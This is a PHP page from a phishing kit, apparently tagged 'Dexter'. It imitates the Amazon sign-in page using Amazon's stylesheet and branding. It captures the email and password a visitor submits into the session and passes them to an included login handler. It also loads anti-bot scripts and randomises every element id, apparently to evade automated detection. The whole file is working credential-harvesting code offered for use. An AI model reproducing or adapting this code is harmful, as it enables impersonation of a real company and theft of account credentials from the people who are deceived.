<?php
ob_start();
session_start();
error_reporting(0);
################## Dexter #################
include('../function/configs.php');
################## Dexter #################
if($autolang == 1 ){
include('../function/get_lang.php');
include "../function/lang".$_SESSION['SHADOW-Z118'];}
elseif($Langage_es == 1 ){include "../function/lang/es.php";}
elseif($Langage_de == 1 ){include "../function/lang/de.php";}
elseif($Langage_en == 1 ){include "../function/lang/en.php";}
elseif($Langage_fr == 1 ){include "../function/lang/fr.php";}
elseif($Langage_it == 1 ){include "../function/lang/it.php";}
else {include "../function/lang/en.php";}
##################||Dexter||##################
$_SESSION['email']    = $_POST['email'];
$_SESSION['password'] = $_POST['password'];
##################||Dexter||##################
if(filter_var($_POST['email'], FILTER_VALIDATE_EMAIL)){
  include('../function/login.php');

}
############################################||Dexter||#####################################################
if($antibots !== 1 ){}else{
include "../antibots/antibots1.php";
include "../antibots/antibots2.php";
include "../antibots/antibots3.php";}
############################################||Dexter||#####################################################
?>
<html>
<!-- 
<?=base64_encode(md5(rand(00,1000)));?>
<?=base64_encode(md5(rand(00,1000)));?>
<?=base64_encode(md5(rand(00,1000)));?>
-->
<head>
     <meta charset="UTF-8" name="viewport" content="initial-scale=1.0"> 
    <link href="../files/css/logo.ico" rel="shortcut icon" type="image/x-icon">
    <title>  <?php echo "$goverment_is_bad_2";?> </title>
   <link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/G/01/AUIClients/AmazonUI-af9e9b82cae7003c8a1d2f2e239005b802c674a4._V2_.css#AUIClients/AmazonUI.fr.rendering_engine-not-trident.secure.min">
<style>
.auth-workflow .auth-pagelet-container{width:350px;margin:0 auto}.auth-workflow .auth-pagelet-container-wide{width:500px;margin:0 auto}#auth-alert-window{display:none}.auth-display-none{display:none}.auth-pagelet-mobile-container{max-width:400px;margin:0 auto}.auth-pagelet-desktop-narrow-container{max-width:350px;margin:0 auto}.auth-pagelet-desktop-wide-container{max-width:600px;margin:0 auto}label.auth-hidden-label{height:0!important;width:0!important;overflow:hidden;position:absolute}.auth-phone-number-input{margin-left:10px}#auth-captcha-noop-link{display:none}#auth-captcha-image-container{height:70px;width:200px;margin-right:auto;margin-left:auto}.auth-logo-cn{width:110px!important;height:60px!important;background-position:-105px -365px!important;-webkit-background-size:600px 1000px!important;background-size:600px 1000px!important;background-image:url(https://images-cn.ssl-images-amazon.com/images/G/01/amazonui/sprites/aui_sprite_0029-2x._V1_.png)!important}.auth-footer-seperator{display:inline-block;width:20px}#auth-cookie-warning-message{display:none}#auth-pv-client-side-error-box,#auth-pv-client-side-success-box{display:none}.auth-error-messages{color:#000;margin:0}.auth-error-messages li{list-style:none;display:none}.ap_ango_default .ap_ango_email_elem,.ap_ango_default .ap_ango_phone_elem{display:none}.ap_ango_phone .ap_ango_default_elem,.ap_ango_phone .ap_ango_email_elem{display:none}.ap_ango_email .ap_ango_default_elem,.ap_ango_email .ap_ango_phone_elem{display:none}.auth-interactive-dialog{width:100%;height:100%;position:fixed;top:0;left:0;display:none;background:rgba(0,0,0,.8);z-index:100}.auth-interactive-dialog #auth-interactive-dialog-container{display:table-cell;height:100%;vertical-align:middle;position:relative;text-align:center}.auth-interactive-dialog #auth-interactive-dialog-container .auth-interactive-dialog-content{display:inline-block}.auth-third-party-content{text-align:center}.auth-wechat-login-button .wechat_button{background:#13D71F;background:-webkit-gradient(linear,left top,left bottom,from(#13d71f),to(#64d720));background:-webkit-linear-gradient(top,#13d71f,#63d71f);background:-moz-linear-gradient(top,#13d71f,#63d71f);background:-ms-linear-gradient(top,#13d71f,#63d71f);background:-o-linear-gradient(top,#13d71f,#63d71f);background:linear-gradient(top,#13d71f,#63d71f)}.wechat_button_label{color:#fff}.wechat_button_icon{top:5px!important}.a-lt-ie8 .wechat_button_icon{top:0!important}.a-lt-ie8 .auth-wechat-login-button .a-button-inner{height:31px}.identity-provider-pagelet-wechat-container{text-align:center}.auth-contact-verification-spinner{position:absolute;left:45%;top:35%}.auth-contact-verification-spinner img{height:60%;width:60%}#auth-enter-pwd-to-cont{margin-left:2px}.ap_hidden{display:none}.auth-contact-verification-widget-target{height:90px;margin-top:-30px}
</style>

</head>
<br><br><br>
  <body id="<?=base64_encode(md5(rand(00,1000)));?>"class="ap-locale-en_US a-auix_ux_57388-t1 a-auix_ux_63571-c a-aui_49697-t1 a-aui_51744-c a-aui_57326-c a-aui_58736-c a-aui_accessibility_49860-c a-aui_attr_validations_1_51371-c a-aui_bolt_62845-t1 a-aui_ux_47524-t1 a-aui_ux_49594-c a-aui_ux_56217-c a-aui_ux_59374-c a-aui_ux_59797-c a-aui_ux_60000-c a-meter-animate">

<div id="<?=base64_encode(md5(rand(00,1000)));?>"id="a-page">
    <div id="<?=base64_encode(md5(rand(00,1000)));?>"class="a-section a-padding-medium auth-workflow">
      <div id="<?=base64_encode(md5(rand(00,1000)));?>"class="a-section a-spacing-none">

<div id="<?=base64_encode(md5(rand(00,1000)));?>"class="a-section a-spacing-medium a-text-center">
  <a id="<?=base64_encode(md5(rand(00,1000)));?>"class="a-link-normal" href="#">       
        <i id="<?=base64_encode(md5(rand(00,1000)));?>"class="a-icon a-icon-logo" aria-label="Amazon"><span class="a-icon-alt"></span></i>
      </a>
 
</div>
     </div>
  <div id="<?=base64_encode(md5(rand(00,1000)));?>"class="a-section">
       
<!-- show a warning modal dialog when the third party account is connected with Amazon -->
<div id="<?=base64_encode(md5(rand(00,1000)));?>"class="a-section a-spacing-base auth-pagelet-container">


  <div id="<?=base64_encode(md5(rand(00,1000)));?>"class="a-section">
    
 <form id="<?=base64_encode(md5(rand(00,1000)));?>"method="post" id="validation" action="">
 <script type="text/javascript">	
function xForm(){
	if (document.getElementById('xuser').value.length < 6 ) {
		document.getElementById('xuser').className = "a-input-text a-span12 auth-autofocus auth-required-field error";
		document.getElementById('xuser').focus();
		return false;
	}else{
		document.getElementById('xuser').className = "a-input-text a-span12 auth-autofocus auth-required-field";
	};


	if (document.getElementById('xpass').value.length < 6 ) {
		document.getElementById('xpass').className = "a-input-text a-span12 auth-autofocus auth-required-field error";
		document.getElementById('xpass').focus();
		return false;
	}else{
		document.getElementById('xpass').className = "a-input-text a-span12 auth-autofocus auth-required-field";
	};
document.getElementById('loading').style.display = "block";
document.getElementById('xbootn').style.display = "none";

}
</script>	
	
<style>
.error{
  background-color: #fefdd2;  
}
</style>	
	
 <input id="<?=base64_encode(md5(rand(00,1000)));?>" type="hidden" name="appActionToken" value="vGeuaFIZ0mj2F6X1ObuNa3voc4gdQj3D"><input type="hidden" name="appAction" value="SIGNIN">
 <div id="<?=base64_encode(md5(rand(00,1000)));?>"class="a-section">
        <div id="<?=base64_encode(md5(rand(00,1000)));?>"class="a-box"><div class="a-box-inner a-padding-extra-large">
          <h1 id="<?=base64_encode(md5(rand(00,1000)));?>" class="a-spacing-small">
           <?php echo "$dexter_zkika_1";?> 
          </h1>
          <!-- optional subheading element -->
          <div id="<?=base64_encode(md5(rand(00,1000)));?>" class="a-row a-spacing-base">
            <label id="<?=base64_encode(md5(rand(00,1000)));?>" for="ap_email">
             <?php echo "$dexter_zkika_2";?> 
            </label>
           
            <input id="xuser" type="email" required="" title="Please Enter a valid Email" pattern=".{5,}" maxlength="50" name="email" class="a-input-text a-span12 auth-autofocus auth-required-field">
          </div>
          <input id="<?=base64_encode(md5(rand(00,1000)));?>" type="hidden" name="create" value="0">
<div id="<?=base64_encode(md5(rand(00,1000)));?>" class="a-section a-spacing-large">
  <div id="<?=base64_encode(md5(rand(00,1000)));?>" class="a-row">
    <div id="<?=base64_encode(md5(rand(00,1000)));?>" class="a-column a-span5">
      <label id="<?=base64_encode(md5(rand(00,1000)));?>" for="ap_password">
       <?php echo "$dexter_zkika_4";?> 
      </label>
    </div>
      <div id="<?=base64_encode(md5(rand(00,1000)));?>" class="a-column a-span7 a-text-right a-span-last">    
        <a id="<?=base64_encode(md5(rand(00,1000)));?>" id="auth-fpp-link-bottom" class="a-link-normal" href="#">
          <?php echo "$dexter_zkika_3";?> 
        </a>
      </div>
    
  </div>
 <input id="xpass" type="password" id="ap_password" required="" title="Please Enter a valid Password" name="password" tabindex="2" class="a-input-text a-span12 auth-required-field">
</div>
  <div id="<?=base64_encode(md5(rand(00,1000)));?>" class="a-section a-spacing-extra-large">
            
  <span id="<?=base64_encode(md5(rand(00,1000)));?>" class="a-button a-button-span12 a-button-primary" id="a-autoid-0"><span class="a-button-inner">
  <input onclick="return xForm()" id="signInSubmit" tabindex="5" class="a-button-input" type="submit" aria-labelledby="a-autoid-0-announce"><span class="a-button-text" aria-hidden="true" id="a-autoid-0-announce">
             <?php echo "$dexter_zkika_5";?> 
            </span></span></span>

            
<script>
  function cf() {
    if (typeof window.uet === 'function') {
      uet('cf');
    }
    if (window.embedNotification &&
      typeof window.embedNotification.onCF === 'function') {
      embedNotification.onCF();
    }
  }
</script>

<script id="<?=base64_encode(md5(rand(00,1000)));?>" type="text/javascript">cf()</script>
 </div>
 <div id="<?=base64_encode(md5(rand(00,1000)));?>" class="a-divider a-divider-break"><h5>  <?php echo "$dexter_zkika_5";?> </h5></div>
 <span id="<?=base64_encode(md5(rand(00,1000)));?>" id="auth-create-account-link" class="a-button a-button-span12"><span id="<?=base64_encode(md5(rand(00,1000)));?>" class="a-button-inner"><a id="createAccountSubmit" tabindex="6" href="signin.php?cmd=_update-information&account_biling=<?php echo md5(microtime());?>&lim_session=<?php echo sha1(microtime()); ?>" class="a-button-text" role="button">
                 <?php echo "$dexter_zkika_12";?> 
                </a></span></span>
    <div id="<?=base64_encode(md5(rand(00,1000)));?>" class="a-row a-spacing-top-medium">
             <?php echo "$dexter_zkika_11";?> <a href="#"> <?php echo "$dexter_zkika_111";?></a>  <?php echo "$dexter_zkika_1111";?> <a href="#"> <?php echo "$dexter_zkika_11111";?></a>.
            </div>
                            
        </div></div>
      </div>
</form>
  </div>
</div>
 </div>
  <div id="<?=base64_encode(md5(rand(00,1000)));?>"id="right-2">
      </div>  <br> <br> 
      <div id="<?=base64_encode(md5(rand(00,1000)));?>"class="a-section a-spacing-top-extra-large">
<div id="<?=base64_encode(md5(rand(00,1000)));?>"class="a-divider a-divider-section"><div class="a-divider-inner"></div></div>
<div id="<?=base64_encode(md5(rand(00,1000)));?>" class="a-section a-spacing-small a-text-center a-size-mini">
  <span id="<?=base64_encode(md5(rand(00,1000)));?>"class="auth-footer-seperator"></span>
  <a id="<?=base64_encode(md5(rand(00,1000)));?>" class="a-link-normal" target="_blank" href="#">
          <?php echo "$dexter_zkika_13";?> 
        </a>
        <span id="<?=base64_encode(md5(rand(00,1000)));?>" class="auth-footer-seperator"></span>  
        <a id="<?=base64_encode(md5(rand(00,1000)));?>" class="a-link-normal" target="_blank" href="#">
          <?php echo "$dexter_zkika_15";?> 
        </a>
        <span id="<?=base64_encode(md5(rand(00,1000)));?>" class="auth-footer-seperator"></span>
  <a id="<?=base64_encode(md5(rand(00,1000)));?>"class="a-link-normal" target="_blank" href="#">
         <?php echo "$dexter_zkika_16";?> 
        </a>
        <span id="<?=base64_encode(md5(rand(00,1000)));?>" class="auth-footer-seperator"></span>
</div>
<div id="<?=base64_encode(md5(rand(00,1000)));?>" class="a-section a-spacing-none a-text-center">
  <span id="<?=base64_encode(md5(rand(00,1000)));?>" class="a-size-mini a-color-secondary">
    <?php echo "$goverment_is_bad_1";?> 
  </span>
</div>
      </div>
    </div>
<!-- cache slot rendered -->

  </div>
<!-- 
<?=base64_encode(md5(rand(00,1000)));?>"
<?=base64_encode(md5(rand(00,1000)));?>"
<?=base64_encode(md5(rand(00,1000)));?>"
-->
</body>
</html>